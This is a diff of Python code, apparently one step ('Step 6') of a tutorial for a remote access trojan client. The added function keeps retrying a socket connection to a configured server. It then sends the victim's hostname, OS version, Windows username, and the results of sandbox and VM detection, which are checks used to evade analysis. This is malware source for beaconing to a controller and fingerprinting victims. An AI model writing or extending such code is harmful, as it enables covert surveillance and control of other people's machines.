@@ -63,11 +63,32 @@ def detectVM():
 
     return ""
 
+# Step 6: Define a Function to Connect Client to the Server
+def server_connect():
+    global objSocket
+
+    while True:
+        # Try to Create a Socket Connection and Connect to Server
+        try:
+            objSocket = socket.socket()
+            objSocket.connect((SERVER_HOST, SERVER_PORT))
+
+        # Handle Socket Connection Error
+        except socket.error:
+            sleep(5)
+
+        else: break
+
+    strUserInfo = (socket.gethostname() + "'," + platform.system() + " " + platform.release() +
+                   detect_sandboxie() + detectVM() + "'," + environ["USERNAME"])
+
+    send(str.encode(strUserInfo))
 
 
 
 
 
+send = lambda data: objSocket.send(data)
 
 
 
